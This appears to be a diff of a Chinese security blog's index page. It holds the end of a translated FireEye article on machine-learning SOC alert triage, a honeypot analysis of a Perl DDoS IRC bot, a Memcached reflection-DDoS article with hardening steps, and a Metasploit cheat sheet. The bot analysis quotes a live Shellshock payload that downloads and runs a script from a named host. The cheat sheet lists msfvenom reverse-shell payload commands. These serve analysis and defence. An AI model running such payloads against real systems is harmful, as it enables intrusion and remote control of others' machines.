+<p>SOC警报模型如何工作<br>当出现新警报时，工件中的数据将转换为编码要素的向量，其结构与用于训练模型的要素表示相同。然后，模型评估该“特征向量”并对预测标签应用置信度。根据我们设置的阈值，我们可以将警报分类为恶意或良性。</p>
+<p>图5：捕获原始值时向分析师显示的警报</p>
+<p>例如，图5中显示的事件可能会创建以下功能值：</p>
+<p>父进程：’wscript’<br>命令熵：5.08<br>命令长度= 103<br>根据它们的训练方式，模型中的树各自询问新特征向量的一系列问题。当特征向量遍历每个树时，它最终会收敛于终端“叶子”，将其分类为良性或恶意。然后，我们可以评估每棵树所做的聚合决策，以估计向量中哪些特征在最终分类中起最大作用。</p>
+<p>对于SOC中的分析师，我们然后呈现从模型中提取的特征，显示这些特征在整个数据集上的分布。这使分析师能够深入了解模型的“原因”，以及它们如何在我们看到的所有警报中表示这些功能。例如，此警报的“说明”可能如下所示：</p>
+<p>命令熵= 5.08&gt; 4.60：51.73％威胁<br>occuranceOfChar“\”= 9.00&gt; 4.50：64.09％威胁<br>occuranceOfChar：“）”（= 0.00）&lt;= 0.50：78.69％威胁<br>NOT processTree =“cmd.exe_to_cscript.exe”：99.6％威胁<br>因此，在分析时，分析人员可以看到事件的原始数据，模型的预测，决策路径的近似，以及整体特征重要性的简化，可解释的视图。</p>
+<p>SOC如何使用模型<br>显示模型用于得出结论的特征允许有经验的分析师将他们的方法与模型进行比较，并在模型出错的情况下给出反馈。相反，新的分析师可能会学会查看他们可能错过的功能：父子关系，混淆的迹象或参数中的网络连接字符串。毕竟，该模型已经了解了每个分析师对数千个警报的集体体验。因此，该模型提供了对分析师总体经验的可操作反映回 SOC，以便每个分析师可以向他们的同事传递学习。</p>
+<p>此外，可以使用模型的输出作为参数来编写规则。如果模型对一部分警报特别有信心，并且SOC感觉很自然地自动对该系列威胁进行分类，则可以简单地编写一条规则来说：“如果警报属于此类型，则此恶意软件系列为AND，并且模型置信度高于99，自动调用此警报并生成报告。“或者，如果存在可能的误报风暴，可以使用低于10的模型得分编写规则来剔除误报群。</p>
+<p>模型如何有效<br>模型训练的那天，它停止学习。但是，威胁 - 以及警报 - 不断发展。因此，必须使用新的警报数据不断重新训练模型，以确保它继续学习环境的变化。</p>
+<p>此外，随着时间的推移监控模型的整体功效至关重要。建立功效分析管道以将模型结果与分析师反馈进行比较将有助于确定模型是否开始漂移或发展结构偏差。评估和整合分析师反馈对于识别和解决特定的错误分类以及发现可能需要的潜在新功能也至关重要。</p>
+<p>为了实现这些目标，我们运行后台工作，使用新标记的事件更新我们的培训数据库。随着我们收到越来越多的警报，我们会定期使用新的观察结果重新训练我们的模型。如果我们遇到准确性问题，我们会进行诊断并努力解决这些问题。一旦我们对再培训模型的整体准确度得分感到满意​​，我们就会存储模型对象并开始使用该模型版本。</p>
+<p>我们还为分析师提供反馈机制，以记录模型何时出错。分析师可以查看模型提供的标签和解释，但也可以自己做出决定。无论他们是否同意模型，他们都可以通过界面输入自己的标签。我们存储由分析师提供的这个标签以及他们给出的关于解释的任何可选解释。</p>
+<p>最后，应该注意的是，这些手册标签可能需要进一步评估。例如，考虑商品恶意软件警报，其中网络命令和控制通信陷入困境。分析师可以评估警报，撤回分类细节，包括PCAP样本，并查看恶意软件执行时的真实威胁减轻了对环境的影响。由于它不代表紧急威胁，分析师可能会将此警报标记为“良性”。然而，它被沉没的事实并没有改变执行工件仍然代表恶意活动。在不同的情况下，这种感染可能会对组织产生负面影响。但是，如果在重新训练模型时使用良性标签，那将告诉模型本质上恶意的东西实际上是良性的，并且可能在将来导致漏报。</p>
+<p>随着时间的推移监控功效，使用新警报更新和重新培训模型，以及评估手动分析师反馈，使我们可以了解模型的表现和学习方式。最终，这有助于建立对模型的信心，因此我们可以自动执行更多任务，并释放分析师时间来执行狩猎和调查等任务。</p>
+<p>结论<br>有监督的学习模型不是经验丰富的分析师的替代品。但是，将预测分析和机器学习纳入SOC工作流程有助于提高分析师的工作效率，节省时间，并确保他们利用调查技能和创造力来应对真正需要专业知识的威胁。</p>
+<p>本博文概述了为SOC构建警报分类模型的主要组件和注意事项。在构建此类模型时，必须仔细考虑数据收集，标签，特征生成，模型培训和功效分析。FireEye继续重复研究，以提高我们的检测和响应能力，不断提高我们产品的检测效率，并最终保护我们的客户。</p>
+<p>本文中讨论的过程和示例不仅仅是研究。在我们的FireEye Managed Defense SOC中，我们使用上述流程构建的警报分类模型来提高效率，并确保我们将分析师的专业知识应用到最需要的地方。在不断增加的威胁和警报的世界中，提高SOC效率可能意味着缺失和捕获关键入侵之间的差异。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2018/09/06/构建SOC的机器学习分析模型/" data-id="cjprqg7ts001g0c9lbnhlgydv" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="w-Perl-DDOS-IrcBot分析" class="article article-type-w" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/08/21/Perl-DDOS-IrcBot分析/" class="article-date">
+  <time datetime="2018-08-21T10:16:51.000Z" itemprop="datePublished">2018-08-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/21/Perl-DDOS-IrcBot分析/">Perl DDOS IrcBot分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h4 id="0x00-入侵分析"><a href="#0x00-入侵分析" class="headerlink" title="0x00 入侵分析"></a>0x00 入侵分析</h4><p>发现一个蜜罐节点存在服务器CPU负载异常：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">PID  USER      PR  NI    VIRT    RES    SHR S %CPU %MEM     TIME+ COMMAND                     3143 ***       20   0   40516   5516   1892 R 97.2  0.3 106:05.31 /usr/sbin/sshd</div></pre></td></tr></table></figure>
+<p>网络连接异常：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tcp        0      0 192.168.152.134:54821   94.23.37.187:88         ESTABLISHED 3143/sshd -D</div></pre></td></tr></table></figure>
+<p>查看蜜罐的服务器日志发现了一条利用Shellsock漏洞(CVE-2014-6271)植入perl脚本并执行的日志：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"http_user_agent"</span>: <span class="string">"() &#123; :;&#125;;/usr/bin/perl -e 'print \"Content-Type: text/plain\\r\\n\\r\\nXSUCCESS!\";system(\"killall -9 perl;wget http://kevelmarine.com/images/gallery/x.log -O /tmp/x.log;curl -O /tmp/x.log http://kevelmarine.com/images/gallery/x.log;perl /tmp/x.log;rm -rf /tmp/x.log*\");'"</span></div></pre></td></tr></table></figure>
+<p>攻击者IP:122.224.145.162(杭州)从<a href="http://kevelmarine.com/" target="_blank" rel="external">http://kevelmarine.com/</a> 下载x.log到/tmp目录，随后执行，最后删除。<a href="http://kevelmarine.com/" target="_blank" rel="external">http://kevelmarine.com/</a> 是一家从事海洋建筑的公司的网站，服务器位于美国，怀疑已经被黑客入侵。</p>
+<h4 id="0x01-IrcBot分析"><a href="#0x01-IrcBot分析" class="headerlink" title="0x01 IrcBot分析"></a>0x01 IrcBot分析</h4><p>根据蜜罐日志记录的下载链接我们得到x.log这个样本，发现这是一个perl实现的后门，代码共916行，通过IRC协议与主控服务器进行交互，主要功能是DDOS。发现一台C&amp;C主机：daddyhax.tk。</p>
+<p>这个样本主要分为以下几个功能模块：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">!u @system 	<span class="comment"># 系统模块</span></div><div class="line">!u @version	<span class="comment"># 版本信息</span></div><div class="line">!u @channel	<span class="comment"># IRC频道操作模块</span></div><div class="line">!u @flood  	<span class="comment"># DDoS模块</span></div><div class="line">!u @utils  	<span class="comment"># 其它功能模块</span></div></pre></td></tr></table></figure>
+<h5 id="进程隐藏功能"><a href="#进程隐藏功能" class="headerlink" title="进程隐藏功能"></a>进程隐藏功能</h5>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2018/08/21/Perl-DDOS-IrcBot分析/" data-id="cjprqg7t900110c9ll2f0c29d" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="w-Perl-IrcBot分析" class="article article-type-w" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/08/21/Perl-IrcBot分析/" class="article-date">
+  <time datetime="2018-08-21T09:59:11.000Z" itemprop="datePublished">2018-08-21</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2018/08/21/Perl-IrcBot分析/">Perl IrcBot分析</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://wsygoogol.github.io/2018/08/21/Perl-IrcBot分析/" data-id="cjprqg7sw000x0c9lzo4co7tv" class="article-share-link">Share</a>
       
       
     </footer>
@@ -145,7 +528,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2018/08/14/使用YARA规则进行威胁狩猎/" data-id="cjl3hvmk60015s89l2732n9jy" class="article-share-link">Share</a>
+      <a data-url="http://wsygoogol.github.io/2018/08/14/使用YARA规则进行威胁狩猎/" data-id="cjprqg7tr001f0c9ly6gaiodn" class="article-share-link">Share</a>
       
       
     </footer>
@@ -214,7 +597,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2018/07/31/Google-Safe-Browsing-Api介绍/" data-id="cjl3hvmjr000us89lxa0wrhgb" class="article-share-link">Share</a>
+      <a data-url="http://wsygoogol.github.io/2018/07/31/Google-Safe-Browsing-Api介绍/" data-id="cjprqg7tc00160c9l7u91bcpm" class="article-share-link">Share</a>
       
       
     </footer>
@@ -262,751 +645,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2018/06/29/数字取证入门/" data-id="cjl3hvmk70016s89le4epd8om" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="w-Dionaea蜜罐部署" class="article article-type-w" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/03/19/Dionaea蜜罐部署/" class="article-date">
-  <time datetime="2018-03-19T03:02:28.000Z" itemprop="datePublished">2018-03-19</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/03/19/Dionaea蜜罐部署/">Dionaea蜜罐部署</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p><a href="http://dionaea.readthedocs.io/en/latest/installation.html" target="_blank" rel="external">http://dionaea.readthedocs.io/en/latest/installation.html</a></p>
-<h4 id="0x00-系统的内核版本和发行版本"><a href="#0x00-系统的内核版本和发行版本" class="headerlink" title="0x00 系统的内核版本和发行版本"></a>0x00 系统的内核版本和发行版本</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">$ uname -a</div><div class="line">Linux wsy-virtual-machine 4.4.0-116-generic <span class="comment">#140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux</span></div><div class="line">$ lsb_release -a</div><div class="line">No LSB modules are available.</div><div class="line">Distributor ID:	Ubuntu</div><div class="line">Description:	Ubuntu 16.04.4 LTS</div><div class="line">Release:	16.04</div><div class="line">Codename:	xenial</div></pre></td></tr></table></figure>
-<h4 id="0x01-安装依赖"><a href="#0x01-安装依赖" class="headerlink" title="0x01 安装依赖"></a>0x01 安装依赖</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt-get install autoconf automake build-essential check cython3 libcurl4-openssl-dev libemu-dev libev-dev libglib2.0-dev libloudmouth1-dev libnetfilter-queue-dev libnl-3-dev libpcap-dev libssl-dev libtool libudns-dev python3 python3-dev python3-bson python3-yaml ttf-liberation</div></pre></td></tr></table></figure>
-<h4 id="0x02-安装dionaea"><a href="#0x02-安装dionaea" class="headerlink" title="0x02 安装dionaea"></a>0x02 安装dionaea</h4><p>下载源码：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/DinoTools/dionaea.git</div><div class="line"><span class="built_in">cd</span>  dionaea</div></pre></td></tr></table></figure>
-<p>成功安装所有依赖关系后,运行autreconf来构建或重建构建脚本,要进入./dionaea目录</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">autoreconf -vi</div></pre></td></tr></table></figure>
-<p>configure:</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./configure --<span class="built_in">disable</span>-werror --prefix=/opt/dionaea --with-python=/usr/bin/python3 --with-cython-dir=/usr/bin --with-ev-include=/usr/include/ --with-ev-lib=/usr/lib --with-emu-lib=/usr/lib/libemu --with-emu-include=/usr/include --with-nl-include=/usr/include/libnl3 --with-nl-lib=/usr/lib</div></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">make</div><div class="line">make install</div></pre></td></tr></table></figure>
-<p>蜜罐被装在了/opt/dionaea目录</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/opt/dionaea<span class="comment"># ls</span></div><div class="line">bin  etc  lib  var</div></pre></td></tr></table></figure>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2018/03/19/Dionaea蜜罐部署/" data-id="cjl3hvmjq000ts89l0iynvo8j" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Blackhat-SEO" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/03/12/Blackhat-SEO/" class="article-date">
-  <time datetime="2018-03-12T02:13:43.000Z" itemprop="datePublished">2018-03-12</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/03/12/Blackhat-SEO/">Blackhat SEO</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2018/03/12/Blackhat-SEO/" data-id="cjl3hvmjf000ps89l00nxs99m" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="w-利用Memcached的反射型DDOS攻击" class="article article-type-w" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/03/06/利用Memcached的反射型DDOS攻击/" class="article-date">
-  <time datetime="2018-03-06T08:25:35.000Z" itemprop="datePublished">2018-03-06</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/03/06/利用Memcached的反射型DDOS攻击/">利用Memcached的反射型DDOS攻击</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h4 id="0x00-影响面"><a href="#0x00-影响面" class="headerlink" title="0x00 影响面"></a>0x00 影响面</h4><p>最近几天，Memcached反射DDOS流量突然增大，引起了国内外多家安全厂商和机构的注意，我也在第一时间持续关注跟踪相关事件。</p>
-<p>根据shodan的统计，国内受<a href="">影响的</a>Memcached服务器大约有27300+个：</p>
-<p><img src="/upload_image/Shodan_11211.png" alt=""></p>
-<p>全球受影响的Memcached服务器大约有119000+个：</p>
-<p><img src="/upload_image/shodan_11211_all.png" alt=""></p>
-<p>DDoSMon统计的Memcache DRDOS在现网中的情况：</p>
-<p><img src="/upload_image/ddosmon_memcache.png" alt=""></p>
-<h4 id="0x01-Memcached-反射DDOS攻击原理"><a href="#0x01-Memcached-反射DDOS攻击原理" class="headerlink" title="0x01 Memcached 反射DDOS攻击原理"></a>0x01 Memcached 反射DDOS攻击原理</h4><h6 id="什么是反射DDOS（DRDOS）"><a href="#什么是反射DDOS（DRDOS）" class="headerlink" title="什么是反射DDOS（DRDOS）"></a>什么是反射DDOS（DRDOS）</h6><p>反射DDOS是发送大量带有被害者IP地址的请求给反射服务器，反射服务器对IP地址源做出大量回应，形成拒绝服务攻击。CLOUDFLARE的这张图很好的解释了DDOS反射攻击过程：</p>
-<p><img src="/upload_image/cloudflare.png" alt=""></p>
-<h6 id="UDP反射放大攻击需要满足的基本条件："><a href="#UDP反射放大攻击需要满足的基本条件：" class="headerlink" title="UDP反射放大攻击需要满足的基本条件："></a>UDP反射放大攻击需要满足的基本条件：</h6><p>1.攻击者，需要能伪造IP，并发送大量伪造IP的请求给反射服务器。</p>
-<p>2.反射服务器，上面需要运行着容易放大反射攻击的服务。</p>
-<p>3.反射服务器的响应包最好远远大于请求包。</p>
-<p>4.反射服务器对应的协议或服务在互联网上有一定的使用量。</p>
-<p>本次事件中，攻击者发送大量带有被害者IP地址的UDP数据包给Memcached服务器，Memcached服务器对伪造的IP地址源做出大量回应，形成分布式拒绝服务攻击。</p>
-<h6 id="本次攻击的特点："><a href="#本次攻击的特点：" class="headerlink" title="本次攻击的特点："></a>本次攻击的特点：</h6><p>1.memcache放大倍数高，最高可以达到51000倍左右。</p>
-<p>2.可被利用的memcache服务器（反射服务器）数量很多，而且这些服务器网络拥有较高的带宽资源。</p>
-<p>下面这张us-cert的表详细的给出了各类反射攻击的放大倍数：</p>
-<p><img src="/upload_image/cert-ddos.png" alt=""></p>
-<p>仅从放大倍数看，memcached 反射DDOS危害要高于其他类型的反射DDOS。</p>
-<h6 id="Memcached-DRDOS攻击流程"><a href="#Memcached-DRDOS攻击流程" class="headerlink" title="Memcached DRDOS攻击流程"></a>Memcached DRDOS攻击流程</h6><p>1.收集反射器,扫描端口和服务，获取不需要认证的Memcache。</p>
-<p>2.上传指定数据到远程服务器Memcached上。</p>
-<p>3.攻击者将自身IP伪造成攻击的目标IP地址，向Memcached反射服务器发送请求读取在Memcached中存储的数据。</p>
-<p>4.Memcached在收到请求后，向伪造的IP回复放大了几万倍的数据包，造成反射DDOS攻击。</p>
-<h4 id="0x02-Memcached环境搭建"><a href="#0x02-Memcached环境搭建" class="headerlink" title="0x02 Memcached环境搭建"></a>0x02 Memcached环境搭建</h4><p>系统centos7</p>
-<p>安装：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum -y install memcached</div></pre></td></tr></table></figure>
-<p>将memcached加入linux服务：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chkconfig --level 2345 memcached on</div></pre></td></tr></table></figure>
-<p>vi /etc/sysconfig/memcached来修改参数， 修改memcached的参数，主要涉及memcached启动绑定的端口、用户、最大连接、最大内存等.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">PORT=<span class="string">"11211"</span></div><div class="line">USER=<span class="string">"memcached"</span></div><div class="line">MAXCONN=<span class="string">"1024"</span></div><div class="line">CACHESIZE=<span class="string">"64"</span></div><div class="line">OPTIONS=<span class="string">""</span></div></pre></td></tr></table></figure>
-<p>启动、关闭、重启memcached服务</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">systemctl start/stop/restart memcached.service</div></pre></td></tr></table></figure>
-<p>修改完配置参数后，需要重启memcached服务来完成参数的生效。</p>
-<p>可使用memcached-tool来检测memcached的服务状态：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">memcached-tool 127.0.0.1:11211 stats</div></pre></td></tr></table></figure>
-<p>正常情况下显示如下：</p>
-<p><img src="/upload_image/memcached_status.png" alt=""></p>
-<h4 id="0x03-DRDOS攻击测试"><a href="#0x03-DRDOS攻击测试" class="headerlink" title="0x03 DRDOS攻击测试"></a>0x03 DRDOS攻击测试</h4><p>蜜罐搭建成功后我们对它进行了一些测试，让我们看看反射放大效果：</p>
-<p><img src="/upload_image/memcached_test.png" alt=""></p>
-<p>可以看到，本次测试放大倍数基本上稳定在2w+多倍，太恐怖了。</p>
-<p>形成的攻击报文如下：</p>
-<p><img src="/upload_image/memcached_pcap.png" alt=""></p>
-<h4 id="0x04Memcached反射DDOS防御"><a href="#0x04Memcached反射DDOS防御" class="headerlink" title="0x04Memcached反射DDOS防御"></a>0x04Memcached反射DDOS防御</h4><h6 id="Memcached攻击流量清洗"><a href="#Memcached攻击流量清洗" class="headerlink" title="Memcached攻击流量清洗"></a>Memcached攻击流量清洗</h6><ol>
-<li><p>运营商处在边界配置UDP访问控制规则和BGP FlowSpec策略，将源端口为11211的流量进行阻断或限速。</p>
-</li>
-<li><p>不具备路由权限的企业客客户，可以在抗DDOS设备上配置防护策略，同样可以对端口为11211的UDP流量进行阻断和限速。</p>
-</li>
-</ol>
-<h6 id="Memcached系统防护加固"><a href="#Memcached系统防护加固" class="headerlink" title="Memcached系统防护加固"></a>Memcached系统防护加固</h6><p>默认情况下Memcached没有配置任何认证鉴权措施，对所有网络可达的客户端可访问。为了避免Memcached系统被攻击者利用，各开发者和memcache管理者，需要对Memcached服务进行安全检查，进行一些加固。</p>
-<h6 id="1-配置监听地址仅限本地回环地址"><a href="#1-配置监听地址仅限本地回环地址" class="headerlink" title="1.配置监听地址仅限本地回环地址"></a>1.配置监听地址仅限本地回环地址</h6><p>在 memcached的配置文件，或者启动参数中，使用”-l 127.0.0.1”指定监听的 ip 地址。</p>
-<p><img src="/upload_image/memcache_jiagu.png" alt=""></p>
-<h6 id="2-配置防火墙-ACL-策略"><a href="#2-配置防火墙-ACL-策略" class="headerlink" title="2.配置防火墙 ACL 策略"></a>2.配置防火墙 ACL 策略</h6><p>使用 iptables 等手段控制 memcached 的端口ACL策略，示例如下：</p>
-<p>仅限来自指定 IP 段的访问</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iptables -t filter -A INPUT -p tcp -s 192.168.1.0/24 --dport 11211 -j ACCEPT</div></pre></td></tr></table></figure>
-<p>屏蔽任何其他 IP 对 Memcached 端口的访问</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">iptables -t filter -A INPUT -p tcp --dport 11211 -j DROP</div></pre></td></tr></table></figure>
-<h6 id="3-配置认证鉴权策略"><a href="#3-配置认证鉴权策略" class="headerlink" title="3. 配置认证鉴权策略"></a>3. 配置认证鉴权策略</h6><p>Memcached 1.4.3 及之后的版本，如果编译时开启了 –enable-sasl，则可以使用 sasl 配置认证。</p>
-<p>安装</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install cyrus-sasl</div></pre></td></tr></table></figure>
-<p>设置用于 Memcached 的 SASL 用户名密码,运行以下命令，指定需要的用户名，然后输入两次密码即可:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">saslpasswd2 -a memcached -c [customized username]</div></pre></td></tr></table></figure>
-<p>由于 SASL 账户密码默认保存在 /etc/sasldb2 文件里，但是该文件权限为 0640 或者 0660，对于运行 Memcached 的 user/group 不可读，因此需要做一些权限上面的修改。</p>
-<p>配置该文件的属组为 Memcached 运行所用的 group。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo chown :memcached /etc/sasldb2</div></pre></td></tr></table></figure>
-<p>配置 Memcached 启用 SASL 认证在 memcached 的配置文件，或者启动参数中，使用 “ -S ” 即可开启 SASL 认证示例配置：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">PORT=&quot;11211&quot;</div><div class="line"></div><div class="line">USER=&quot;memcached&quot;</div><div class="line"></div><div class="line">MAXCONN=&quot;1024&quot;</div><div class="line"></div><div class="line">CACHESIZE=&quot;64&quot;</div><div class="line"></div><div class="line">OPTIONS=&quot;-S&quot;</div></pre></td></tr></table></figure>
-<h4 id="0x05-追溯处置措施"><a href="#0x05-追溯处置措施" class="headerlink" title="0x05 追溯处置措施"></a>0x05 追溯处置措施</h4><p>这种反射DDOS攻击源追踪难点在于准确定位，在被攻击端，看到的IP都是真实的IP，都是被利用的反射放大节点服务器。和直接攻击不一样，因为有反射的因素，这时候看到的真实攻击IP不是真正的发起原始流量的IP。下面结合以往追溯DDOS攻击的经验给出几点建议<strong>：</strong></p>
-<h6 id="反射源上找线索"><a href="#反射源上找线索" class="headerlink" title="反射源上找线索"></a>反射源上找线索</h6><p>通过memcached蜜罐监测，看初期的信息采集阶段（比如找可用度反射放大源）很可能用的就是自己的IP，各种小动作会露出马脚，再多个维度关联，有时也能找出攻击者。</p>
-<h6 id="失陷主机上找线索"><a href="#失陷主机上找线索" class="headerlink" title="失陷主机上找线索"></a>失陷主机上找线索</h6><p>在一次大流量过后，访问量高的IP都可以列为可疑目标，重点排查，尤其要注意筛选ICMP数据包，一般情况下攻击者有个习惯：就是在攻击的过程中和攻击结束都会用本机ping目标服务器，查看目标的存活性。如果运气好，能找出攻击者。</p>
-<h6 id="运营商配合定位攻击者"><a href="#运营商配合定位攻击者" class="headerlink" title="运营商配合定位攻击者"></a>运营商配合定位攻击者</h6><p>通过memcached蜜罐的监测，根据以上测试过程中得出的Memcached DRDOS攻击的流量特征，和运营商配合，看哪些子网有非自己段的源IP流量出来，然后再做端的流量监测，比如HIDS，即为可以找出可疑IP。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2018/03/06/利用Memcached的反射型DDOS攻击/" data-id="cjl3hvmk80017s89ll027ax32" class="article-share-link">Share</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-metasploit备忘" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/01/28/metasploit备忘/" class="article-date">
-  <time datetime="2018-01-28T11:24:54.000Z" itemprop="datePublished">2018-01-28</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/01/28/metasploit备忘/">metasploit备忘</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>Creating Metasploit Payloads</p>
-<p>List payloads<br>msfvenom -l</p>
-<p>Binaries</p>
-<p>Linux<br>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f elf &gt; shell.elf</your></your></p>
-<p>Windows<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f exe &gt; shell.exe</your></your></p>
-<p>Mac<br>msfvenom -p osx/x86/shell_reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f macho &gt; shell.macho</your></your></p>
-<p>Web Payloads</p>
-<p>PHP<br>msfvenom -p php/meterpreter_reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f raw &gt; shell.php<br>cat shell.php | pbcopy &amp;&amp; echo ‘&lt;?php ‘ | tr -d ‘\n’ &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</your></your></p>
-<p>ASP<br>msfvenom -p windows/meterpreter/reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f asp &gt; shell.asp</your></your></p>
-<p>JSP<br>msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f raw &gt; shell.jsp</your></your></p>
-<p>WAR<br>msfvenom -p java/jsp_shell_reverse_tcp LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f war &gt; shell.war</your></your></p>
-<p>Scripting Payloads</p>
-<p>Python<br>msfvenom -p cmd/unix/reverse_python LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f raw &gt; shell.py</your></your></p>
-<p>Bash<br>msfvenom -p cmd/unix/reverse_bash LHOST=<your ip="" address=""> LPORT=<your port="" to="" connect="" on=""> -f raw &gt; shell.sh</your></your></p>
